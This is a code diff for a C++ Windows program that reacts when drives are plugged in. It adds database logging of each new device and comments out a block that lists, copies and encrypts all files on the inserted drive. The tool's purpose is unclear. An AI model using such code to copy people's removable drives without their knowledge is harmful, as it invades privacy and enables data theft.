@@ -22,6 +22,18 @@ bool IsServiceOn = true;
 
 void DeviceArrivalMain(TCHAR DriveLetter) {
 	Device dv(DriveLetter);
+
+	try {
+		SQLConnection conn(L"test.idb");
+		conn.open();
+		conn.insertRecord(dv);
+		conn.close();
+	}
+	catch (sql_connection_error & sqle) {
+		MessageBoxA(NULL, sqle.what(), "", MB_ICONERROR);
+	}
+
+	/*
 	Device::DiskInformation info = dv.GetDiskInformation();
 	FileLister lister(dv);
 	shared_ptr<list<FileData>> pls = lister.ListFile();
@@ -31,6 +43,7 @@ void DeviceArrivalMain(TCHAR DriveLetter) {
 	cp.ListFile(pls);
 	cp.Copy();
 	cp.Encrypt();
+	*/
 	/*
 	if (SystemConfig::getInstance()->FileCopyer) {
 		if (SystemConfig::getInstance()->NormalCopy) {
@@ -57,12 +70,5 @@ void DeviceRemovalMain(TCHAR DriveLetter) {
 
 // Usually this function should be empty.
 void InitProgram() {
-	try {
-		SQLConnection conn(L"test.idb");
-		conn.open();
-		conn.close();
-	}
-	catch (sql_connection_error & sqle) {
-		MessageBoxA(NULL, sqle.what(), "", MB_ICONERROR);
-	}
+	
 }
